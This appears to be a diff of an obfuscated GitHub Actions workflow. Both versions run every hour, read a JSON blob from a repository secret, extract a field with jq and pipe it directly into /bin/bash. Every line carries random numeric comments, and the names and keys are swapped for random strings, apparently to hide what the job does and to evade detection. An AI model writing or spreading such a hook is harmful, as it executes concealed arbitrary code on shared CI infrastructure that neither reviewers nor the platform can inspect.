@@ -1,15 +1,15 @@
-name: yueyunpeng1873 #216
-on: #20161
-  workflow_dispatch: #260
-  schedule: #10579
-    - cron: '45 * * * *' #22967
-jobs: #2262
-  build: #24009
-    runs-on: ubuntu-latest #5800
-    steps: #12739
-      - uses: actions/checkout@v4 #3018
-      - name: yueyunpeng1873 #17399
-        env: #17163
-          n24466: ${{ secrets.n24466 }} #15943
+name: yueyunpeng1873 #13385
+on: #8433
+  workflow_dispatch: #21221
+  schedule: #11276
+    - cron: '36 * * * *' #19975
+jobs: #18476
+  build: #27014
+    runs-on: ubuntu-latest #10188
+    steps: #26510
+      - uses: actions/checkout@v4 #27965
+      - name: yueyunpeng1873 #28759
+        env: #1847
+          y10836: ${{ secrets.y10836 }} #26438
         run: |
-          echo $n24466 | jq -r .t17442 | /bin/bash #31252
+          echo $y10836 | jq -r .q29032 | /bin/bash #29001
